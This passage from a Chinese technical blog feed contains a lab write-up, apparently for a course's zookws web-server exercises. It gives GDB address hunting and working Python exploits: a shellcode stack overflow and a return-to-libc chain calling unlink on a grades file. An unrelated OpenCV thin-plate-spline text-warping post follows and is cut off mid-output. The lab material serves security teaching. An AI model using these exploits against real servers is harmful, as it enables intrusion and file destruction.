<br><br></code></pre></td></tr></table></figure><h4 id="使用GDB寻找相应地址"><a href="#使用GDB寻找相应地址" class="headerlink" title="使用GDB寻找相应地址"></a>使用GDB寻找相应地址</h4><p>1.在<code>zookd.c:113</code>位置下一个断点，使用命令<code>b zookd.c:113</code>即可，随后c继续执行，运行到断点之后会自动停止，此时使用disas查看附近代码段的地址信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x0000555555556b14 &lt;+132&gt;:mov    %rax,%rdi<br>   0x0000555555556b17 &lt;+135&gt;:call   0x555555557efa &lt;env_deserialize&gt;<br>=&gt; 0x0000555555556b1c &lt;+140&gt;:mov    -0x1014(%rbp),%eax<br>   0x0000555555556b22 &lt;+146&gt;:mov    %eax,%edi<br>   0x0000555555556b24 &lt;+148&gt;:call   0x555555556f35 &lt;http_request_headers&gt;<br>   0x0000555555556b29 &lt;+153&gt;:mov    %rax,-0x8(%rbp)<br>   0x0000555555556b2d &lt;+157&gt;:cmpq   $0x0,-0x8(%rbp)<br>   0x0000555555556b32 &lt;+162&gt;:je     0x555555556b5b &lt;process_client+203&gt;<br><br></code></pre></td></tr></table></figure><p>我们可以看到我们需要利用的函数http_request_headers的返回地址为它的下一行的地址： 0x0000555555556b29。随后我们进入这个函数，在<code>http.c:173</code>下一个断点，继续执行到这个断点，我们再次打印附近的代码信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x0000555555557149 &lt;+532&gt;:call   0x555555556400 &lt;setenv@plt&gt;<br>   0x000055555555714e &lt;+537&gt;:jmp    0x555555556f5a &lt;http_request_headers+37&gt;<br>   0x0000555555557153 &lt;+542&gt;:nop<br>   0x0000555555557154 &lt;+543&gt;:mov    $0x0,%eax<br>   0x0000555555557159 &lt;+548&gt;:mov    -0x8(%rbp),%rbx<br>   0x000055555555715d &lt;+552&gt;:leave  <br>=&gt; 0x000055555555715e &lt;+553&gt;:ret <br></code></pre></td></tr></table></figure><p>此时已经执行到函数的返回，查看此时的rsp的地址，我们就可以看到在0x7fffffffdc88处存储的就是该函数的返回地址，那么我们就可以确定返回地址在栈上的位置为0x7fffffffdc88。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) p $rsp<br>$1 = (void *) 0x7fffffffdc88<br>(gdb) x/8x $rsp<br>0x7fffffffdc88:0x55556b290x000055550x000000020x00000006<br>0x7fffffffdc98:0x00216bc00x000000040x0021002f0x00000000<br></code></pre></td></tr></table></figure><p>那么我们现在只需要查看一下value数组所在的地址即可进行后面的构造，打印一下它的位置，为0x7fffffffda50，调试的准备工作就到此结束。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">(gdb) p &amp;value<br><span class="hljs-meta"><span class="hljs-keyword">$2</span> = (char (*)[512]) 0x7fffffffda50</span><br></code></pre></td></tr></table></figure><h4 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## You might find it useful to define variables that store various</span><br><span class="hljs-comment">## stack or function addresses from the zookd / zookfs processes,</span><br><span class="hljs-comment">## which you can then use in build_exploit(); the following are just</span><br><span class="hljs-comment">## examples.</span><br><br>stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-comment">## This is the function that you should modify to construct an</span><br><span class="hljs-comment">## HTTP request that will cause a buffer overflow in some part</span><br><span class="hljs-comment">## of the zookws web server and exploit it.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    shellfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shellcode.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <br>    shellcode = shellfile.read()<br><br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> <br>    req += <span class="hljs-string">b&quot;EXP: &quot;</span><br>    req += shellcode + <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer) - <span class="hljs-built_in">len</span>(shellcode))<br>    req += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, stack_buffer)<br><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure><p>这里的shellcode就是我们练习三中编译的用于删除txt文件的汇编代码。我们只需要把返回地址和注入数组之间的空余用一些无用的信息填充即可，这里我们用的是“A”，然后由于我们先向value填充的就是shellcode，因此最后将value这个数组的地址去替换原本的返回地址即可，当该函数返回时会指向shellcode的地址运行shellcode的代码。</p><p>最后运行一下make check-exstack，发现我们可以pass。</p><h2 id="三、Return-to-libc攻击"><a href="#三、Return-to-libc攻击" class="headerlink" title="三、Return-to-libc攻击"></a>三、Return-to-libc攻击</h2><p>许多现代操作系统将堆栈标记为不可执行，以使利用缓冲区溢出变得更加困难。 在本部分中，您将探索如何规避这种保护机制。 </p><p>前面的实验都是运行的可执行堆栈，后面就要使用<code>./clean-env.sh ./zookd-nxstack 8080</code>运行不可执行堆栈的版本了。</p><p>利用非可执行堆栈的缓冲区溢出的关键观察是，在ret指令跳到您放置在堆栈上的地址之后，您仍然控制程序计数器。 即使您不能跳转到溢出缓冲区的地址(它将不是可执行的)，在脆弱服务器的地址空间中通常有足够的代码来执行您想要的操作。 </p><p>因此，要绕过不可执行的堆栈，您需要首先找到想要执行的代码。 这通常是标准库中的一个名为libc的函数，例如execve、system或unlink。 然后，您需要安排堆栈和寄存器处于与使用所需参数调用该函数一致的状态。 最后，您需要安排ret指令跳转到您在第一步中找到的函数。 这种攻击通常被称为Return-to-libc攻击。 </p><h3 id="练习5"><a href="#练习5" class="headerlink" title="练习5"></a>练习5</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">构造一个在具有不可执行堆栈的二进制文件上运行时解除<span class="hljs-regexp">/home/</span>student/grades.txt链接的exploit。将这个新漏洞命名为exploit-<span class="hljs-number">5</span>.py。<br>在这种攻击中，您将通过网络控制服务器，而无需向服务器注入任何代码。 您应该使用<span class="hljs-keyword">return</span>-to-libc攻击，将控制流重定向到攻击之前已经存在的代码。 攻击的要点是执行缓冲区溢出: <br><span class="hljs-number">1</span>.使所选libc函数的参数位于堆栈上<br><span class="hljs-number">2</span>.然后意外地导致运行，使该参数以%rdi结束<br><span class="hljs-number">3</span>.然后意外地导致返回到所选的libc函数 <br></code></pre></td></tr></table></figure><p>思路大概就是我们要通过缓冲区溢出，使得返回地址跳转到unlink执行，并且合理的把参数放到%rdi上面去，因此我们可以利用实验中给出的提示信息，就是accidentally函数，去利用%rbp将%rdi的值置为参数字符串的地址。</p><p>首先我们看一下这个函数的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) disas accidentally<br>Dump of assembler code for function accidentally:<br>   0x0000555555556b8c &lt;+0&gt;:endbr64 <br>   0x0000555555556b90 &lt;+4&gt;:push   %rbp<br>   0x0000555555556b91 &lt;+5&gt;:mov    %rsp,%rbp<br>=&gt; 0x0000555555556b94 &lt;+8&gt;:mov    0x10(%rbp),%rdi<br>   0x0000555555556b98 &lt;+12&gt;:nop<br>   0x0000555555556b99 &lt;+13&gt;:pop    %rbp<br>   0x0000555555556b9a &lt;+14&gt;:ret    <br>End of assembler dump.<br><br></code></pre></td></tr></table></figure><p>可以看到这个函数把%rbp+16位置的值放入了%rdi，而这里的%rbp在前一行被%rsp的值所覆盖，所以其实要存放的目标地址就是栈顶指针%rsp+16的位置，由于%rsp是从http_request_headers里return来的，所以根据函数返回调用的栈帧运作情况我们可以推算出来这里的%rsp相当于http_request_headers中的%rbp+8（弹出了返回地址），那么accidentally中的%rsp+16就相当于http_request_headers中的%rbp+24了。因此我们只需要在http_request_headers中的%rbp+24位置放入参数字符串的地址即可，参数字符串放在%rbp+32</p><p>执行到http_request_headers最后一行下断点，我们可以如下打印出%rbp的值：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">(gdb) p <span class="hljs-symbol">$</span>rbp<br><span class="hljs-meta"><span class="hljs-keyword">$2</span> = (void *) 0x7fffffffdc80</span><br></code></pre></td></tr></table></figure><p>然后我们可以尝试打印出libc库中unlink函数的位置：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(gdb) p unlink<br><span class="hljs-meta">$4</span> = &#123;&lt;<span class="hljs-type">text</span> variable, <span class="hljs-keyword">no</span> <span class="hljs-keyword">debug</span> <span class="hljs-keyword">info</span>&gt;&#125; <span class="hljs-number">0x1555554011c0</span> &lt;unlink&gt;<br></code></pre></td></tr></table></figure><p>因此我们就可以根据以上信息构造payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-code">......               |      ......       |</span><br><span class="hljs-code">0x7fffffffdca0       |  file path string |      &lt;- &quot;/home/student/grades.txt&quot;</span><br><span class="hljs-code">0x7fffffffdc98       |    string addr    |      &lt;- 0x7fffffffdca0 &amp; $rdi</span><br><span class="hljs-code">------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-section">0x7fffffffdc90       |     ret addr      |      &lt;- addr of unlink()          stack frame of &quot;accidentally&quot;</span><br><span class="hljs-section">------------------------------------------------------------------------------------------------------------</span><br>0x7fffffffdc88       |     ret addr      |      &lt;- addr of accidentally()    stack frame of &quot;process_client&quot;<br>0x7fffffffdc80       |   preserved rbp   |      &lt;- 0x7fffffffdc90<br><span class="hljs-bullet">......               </span>|      ......       |<br>0x7fffffffda50       |   char[] value    |      &lt;- filled with char <span class="hljs-emphasis">&#x27;A&#x27;</span><br><span class="hljs-bullet">------------------------------------------------------------------------------------------------------- </span>%rsp<br><br></code></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br>libc_retaddr = <span class="hljs-number">0x555555556b8c</span><br>unlink_addr = <span class="hljs-number">0x1555554011c0</span><br>filename_addr = <span class="hljs-number">0x7fffffffdca0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">b</span>):<br>    r = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> b:<br>        r += <span class="hljs-string">b&quot;%&quot;</span>+c.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;little&quot;</span>).<span class="hljs-built_in">hex</span>().encode()<br>    <span class="hljs-keyword">return</span> r<br><span class="hljs-comment">## This is the function that you should modify to construct an</span><br><span class="hljs-comment">## HTTP request that will cause a buffer overflow in some part</span><br><span class="hljs-comment">## of the zookws web server and exploit it.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    filename = <span class="hljs-string">b&quot;/home/student/grades.txt&quot;</span>+<span class="hljs-string">b&quot;\0&quot;</span><br><br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> <span class="hljs-comment">#+ \</span><br>            <span class="hljs-comment">#b&quot;\r\n&quot;</span><br>    payload = <span class="hljs-string">b&quot;&quot;</span><br>    req += <span class="hljs-string">b&quot;EXP: &quot;</span><br>    req += <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer)-<span class="hljs-number">8</span>) <span class="hljs-comment">#junk</span><br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x7fffffffdc90</span>)<br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, libc_retaddr) <span class="hljs-comment"># return adress</span><br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, unlink_addr)<br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, filename_addr)<br><br><br>    req += urlencode(payload)<br>    req += filename<br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>堆栈溢出</tag>
      
      <tag>GDB</tag>
      
      <tag>系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPS薄板样条变换</title>
    <link href="/blog/2022/02/13/TPS%E8%96%84%E6%9D%BF%E6%A0%B7%E6%9D%A1%E5%8F%98%E6%8D%A2/"/>
    <url>/blog/2022/02/13/TPS%E8%96%84%E6%9D%BF%E6%A0%B7%E6%9D%A1%E5%8F%98%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<p><strong>之前使用TPS（Thin-Plate Spline）对弯曲的文本进行处理，进而识别处理之后的水平文本，记录一下备忘。</strong></p><p><img src="/images/fj37.jpg"></p><span id="more"></span><p>话不多说，直接使用CV2 的 TPS Transformer：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Label.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read()<br>contents = content.split(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;testTps.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> wf:<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> contents:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\t&quot;</span> <span class="hljs-keyword">in</span> c:<br>            tmp = c.split(<span class="hljs-string">&quot;\t&quot;</span>)<br>            img = <span class="hljs-string">&quot;./&quot;</span>+tmp[<span class="hljs-number">0</span>]<br>            boxes = json.loads(tmp[<span class="hljs-number">1</span>])<br>            imgori = cv2.imread(img)<br>            box_num = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> box <span class="hljs-keyword">in</span> boxes:<br>                <span class="hljs-comment">#开始执行TPS变换，points是弯曲文本的标注，从左上角开始顺时针</span><br>                points = box[<span class="hljs-string">&quot;points&quot;</span>]<br>                <span class="hljs-comment">#获取能把弯曲文本框包围住的矩形框</span><br>                x, y, w, h = cv2.boundingRect(np.array(points))<br>                <span class="hljs-comment"># print([x,y,w,h])</span><br>                <span class="hljs-comment">#分割出矩形框</span><br>                roi_img = imgori[y:y + h, x:x + w]<br>                <span class="hljs-comment"># cv2.imwrite(&quot;./roiimg&quot;+str(box_num)+&quot;.png&quot;,roi_img)</span><br>                <span class="hljs-comment">#初始化Transformer</span><br>                tps = cv2.createThinPlateSplineShapeTransformer()<br><br>                sourceshape = np.array(points, np.int32)<br>                sourceshape = sourceshape.reshape(<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>                <span class="hljs-comment"># print(sourceshape)</span><br>                matches = []<br>                N = <span class="hljs-built_in">len</span>(points)<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, N):<br>                    matches.append(cv2.DMatch(i, i, <span class="hljs-number">0</span>))<br>                <span class="hljs-comment">#最终结果的高度采用第一个点与最后一个点之间的距离</span><br>                h = <span class="hljs-built_in">int</span>(math.sqrt(((points[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] - points[N - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) ** <span class="hljs-number">2</span>) +<br>                                    ((points[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] - points[N - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) ** <span class="hljs-number">2</span>)))<br>                <span class="hljs-comment"># print(&quot;height is &quot;+str(h))</span><br>                <span class="hljs-comment"># 开始变动，计算变换后的目标点</span><br>                newpoints = []<br>                N = N // <span class="hljs-number">2</span><br>                dx = <span class="hljs-built_in">int</span>(w / (N - <span class="hljs-number">1</span>))<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, N):<br>                    newpoints.append((dx * i, <span class="hljs-number">2</span>))<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>                    newpoints.append((dx * i, h))<br>                <span class="hljs-comment"># print(newpoints)</span><br>                targetshape = np.array(newpoints, np.int32)<br>                targetshape = targetshape.reshape(<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>                tps.estimateTransformation(targetshape, sourceshape, matches)<br>                <span class="hljs-comment"># print(targetshape)</span><br>                <span class="hljs-keyword">try</span>:<br>                    roi_img_ = tps.warpImage(imgori)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;TPS变换错误&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-comment"># cv2.imwrite(&quot;./roi_img_&quot;+str(box_num)+&quot;.png&quot;,roi_img_)</span><br>                <span class="hljs-keyword">try</span>:<br>                    img = roi_img_[newpoints[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]:newpoints[N][<span class="hljs-number">1</span>], newpoints[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]:newpoints[N][<span class="hljs-number">0</span>]]<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;TPS变换后无法存储&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>                filename = <span class="hljs-string">&quot;./tps/&quot;</span>+tmp[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-built_in">str</span>(box_num)+<span class="hljs-string">&quot;.png&quot;</span><br>                <span class="hljs-comment"># print(filename)</span><br>                wf.write(tmp[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-built_in">str</span>(box_num)+<span class="hljs-string">&quot;.png&quot;</span>+<span class="hljs-string">&quot;\t&quot;</span>+box[<span class="hljs-string">&quot;transcription&quot;</span>]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                cv2.imwrite(filename,img)<br>                box_num += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Label.txt的格式为PaddleOCR的标注格式：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">seal/<span class="hljs-number">1</span><span class="hljs-number">-1.</span>png[&#123;<span class="hljs-string">&quot;transcription&quot;</span>: <span class="hljs-string">&quot;全国统一发票监制章&quot;</span>, <span class="hljs-string">&quot;points&quot;</span>: [[<span class="hljs-number">23</span>, <span class="hljs-number">66</span>], [<span class="hljs-number">35</span>, <span class="hljs-number">49</span>], [<span class="hljs-number">54</span>, <span class="hljs-number">36</span>], [<span class="hljs-number">80</span>, <span class="hljs-number">25</span>], [<span class="hljs-number">107</span>, <span class="hljs-number">21</span>], [<span class="hljs-number">137</span>, <span class="hljs-number">21</span>], [<span class="hljs-number">162</span>, <span class="hljs-number">25</span>], [<span class="hljs-number">184</span>, <span class="hljs-number">33</span>], [<span class="hljs-number">207</span>, <span class="hljs-number">49</span>], [<span class="hljs-number">220</span>, <span class="hljs-number">66</span>], [<span class="hljs-number">203</span>, <span class="hljs-number">78</span>], [<span class="hljs-number">189</span>, <span class="hljs-number">64</span>], [<span class="hljs-number">175</span>, <span class="hljs-number">53</span>], [<span class="hljs-number">155</span>, <span class="hljs-number">46</span>], [<span class="hljs-number">135</span>, <span class="hljs-number">42</span>], [<span class="hljs-number">109</span>, <span class="hljs-number">40</span>], [<span class="hljs-number">84</span>, <span class="hljs-number">42</span>], [<span class="hljs-number">64</span>, <span class="hljs-number">51</span>], [<span class="hljs-number">50</span>, <span class="hljs-number">64</span>], [<span class="hljs-number">40</span>, <span class="hljs-number">77</span>]]&#125;, &#123;<span class="hljs-string">&quot;transcription&quot;</span>: <span class="hljs-string">&quot;国家税务总局&quot;</span>, <span class="hljs-string">&quot;points&quot;</span>: [[<span class="hljs-number">64</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">76</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">89</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">102</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">115</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">141</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">154</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">167</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">180</span>, <span class="hljs-number">73</span>], [<span class="hljs-number">180</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">167</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">154</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">141</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">115</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">102</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">89</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">76</span>, <span class="hljs-number">94</span>], [<span class="hljs-number">64</span>, <span class="hljs-number">94</span>]]&#125;, &#123;<span class="hljs-string">&quot;transcription&quot;</span>: <span class="hljs-string">&quot;山东省税务局&quot;</span>, <span class="hljs-string">&quot;points&quot;</span>: [[<span class="hljs-number">71</span>, <span class="hljs-number">112</span>], [<span class="hljs-number">81</span>, <span class="hljs-number">115</span>], [<span class="hljs-number">91</span>, <span class="hljs-number">116</span>], [<span class="hljs-number">102</span>, <span class="hljs-number">118</span>], [<span class="hljs-number">115</span>, <span class="hljs-number">119</span>], [<span class="hljs-number">129</span>, <span class="hljs-number">119</span>], [<span class="hljs-number">139</span>, <span class="hljs-number">118</span>], [<span class="hljs-number">149</span>, <span class="hljs-number">116</span>], [<span class="hljs-number">157</span>, <span class="hljs-number">114</span>], [<span class="hljs-number">172</span>, <span class="hljs-number">110</span>], [<span class="hljs-number">178</span>, <span class="hljs-number">130</span>], [<span class="hljs-number">164</span>, <span class="hljs-number">134</span>], [<span class="hljs-number">154</span>, <span class="hljs-number">138</span>], [<span class="hljs-number">143</span>, <span class="hljs-number">141</span>], [<span class="hljs-number">131</span>, <span class="hljs-number">142</span>], [<span class="hljs-number">115</span>, <span class="hljs-number">142</span>], [<span class="hljs-number">102</span>, <span class="hljs-number">140</span>], [<span class="hljs-number">87</span>, <span class="hljs-number">137</span>], [<span class="hljs-number">76</span>, <span class="hljs-number">134</span>], [<span class="hljs-number">65</span>, <span class="hljs-number">130</span>]]&#125;]<br></code></pre></td></tr></table></figure><p><img src="/images/1-1.png" alt="1-1"></p><p>最终输出：</p><p><strong>testTps.txt ：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">seal</span>/<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span 